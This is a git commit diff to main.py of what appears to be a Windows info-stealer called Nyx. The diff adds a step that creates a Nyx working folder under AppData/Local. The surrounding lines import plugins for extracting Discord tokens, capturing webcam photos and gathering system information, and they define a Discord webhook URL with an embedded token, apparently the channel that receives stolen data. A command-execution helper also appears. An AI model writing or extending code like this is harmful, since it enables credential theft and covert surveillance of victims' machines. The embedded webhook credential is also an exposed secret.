327261073eb968df93deb6143bc5022ededfca25
Faccin27 <gfaccin27@gmail.com>
2024-09-14 05:57:38 -0300

    feat: create Nyx folder in AppData/Local

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 import subprocess
 import requests
+import os
 from plugins.systeminfo import obter_informacoes_sistema
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
@@ -9,6 +10,12 @@ from plugins.operationsystem import get_os_info
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
 webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
 webhook_username = "Nyxbot"
+
+appdata_local = os.getenv('LOCALAPPDATA')
+pasta_nyx = os.path.join(appdata_local, 'Nyx')
+if not os.path.exists(pasta_nyx):
+    os.makedirs(pasta_nyx)
+
 
 def executar_comando(comando):
     try:
